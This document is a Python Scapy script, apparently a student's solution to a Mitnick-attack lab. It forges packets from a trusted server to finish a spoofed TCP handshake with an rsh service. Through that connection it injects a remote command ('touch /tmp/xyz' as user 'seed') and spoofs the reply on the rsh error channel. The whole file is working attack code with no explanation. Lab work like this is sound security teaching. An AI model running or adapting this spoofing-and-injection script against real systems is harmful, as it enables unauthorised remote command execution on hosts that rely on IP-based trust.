#!/usr/bin/python3
from scapy.all import *
VM_SERVER = "10.0.2.5"  # Host A's IP
VM_X_TERM = "10.0.2.6"  # Host B's IP
VM_X_TERM_MAC = "08:00:27:05:41:63"
bpf_filter = "tcp and src host " + VM_X_TERM + " and dst host " + VM_SERVER
X_PORT = 514
ERROR_PORT = 9090
SRV_PORT = 1023
seq_num = 1000
ack_num = None
stop_sniffing = False
stop_sniffing2 = False
seq_num_error = None
ack_num_error = None
def response_syn_ack(pkt):
    global stop_sniffing
    global seq_num
    global ack_num
    if(pkt[TCP].flags == "SA"):
        e = Ether(dst = VM_X_TERM_MAC)
        a = IP()
        a.src = VM_SERVER
        a.dst = VM_X_TERM
        b = TCP()
        b.sport = SRV_PORT
        b.dport = X_PORT
        b.seq = seq_num + 1
        seq_num = b.seq # to use in rsh data
        b.ack = pkt[TCP].seq + 1
        ack_num = b.ack # to use in rsh data
        b.flags = "A"
        pkt = e/a/b
        sendp(pkt, verbose=0)
        stop_sniffing = True
####################
def response_syn_error(pkt):
    global stop_sniffing2
    global seq_num2
    global ack_num2
    if(pkt[TCP].flags == "S"):
        e = Ether(dst = VM_X_TERM_MAC)
        a = IP()
        a.src = VM_SERVER
        a.dst = VM_X_TERM
        b = TCP()
        b.sport = ERROR_PORT
        b.dport = pkt[TCP].sport
        b.seq = seq_num
        b.ack = pkt[TCP].seq + 1
        b.flags = "SA"
        pkt = e/a/b
        sendp(pkt, verbose=0)
        stop_sniffing2 = True
##################
def stop_condition(pkt):
    return stop_sniffing
def stop_condition2(pkt):
    return stop_sniffing2
##################send syn pkt
e = Ether(dst = VM_X_TERM_MAC)
a = IP()
a.src = VM_SERVER
a.dst = VM_X_TERM
b = TCP()
b.sport = SRV_PORT
b.dport = X_PORT
b.seq = seq_num
b.flags = "S"
pkt = e/a/b
sendp(pkt, verbose=0)
print("syn packet sent!!!!")
#####################sniff_spoff (syn_ack response)
sniff(filter=bpf_filter, prn=response_syn_ack, stop_filter=stop_condition)
print("syn_ack response sent!!!!")
##########################rsh data sent
e = Ether(dst = VM_X_TERM_MAC)
a = IP()
a.src = VM_SERVER
a.dst = VM_X_TERM
b = TCP()
b.sport = SRV_PORT
b.dport = X_PORT
b.seq = seq_num
b.ack = ack_num
b.flags = "A"
data = str(ERROR_PORT) + "\x00seed\x00seed\x00touch /tmp/xyz\x00"
pkt = e/a/b/data
sendp(pkt, verbose=0)
print("rsh data sent!!!!")
######################
sniff(filter="tcp", prn=response_syn_error, stop_filter=stop_condition2)
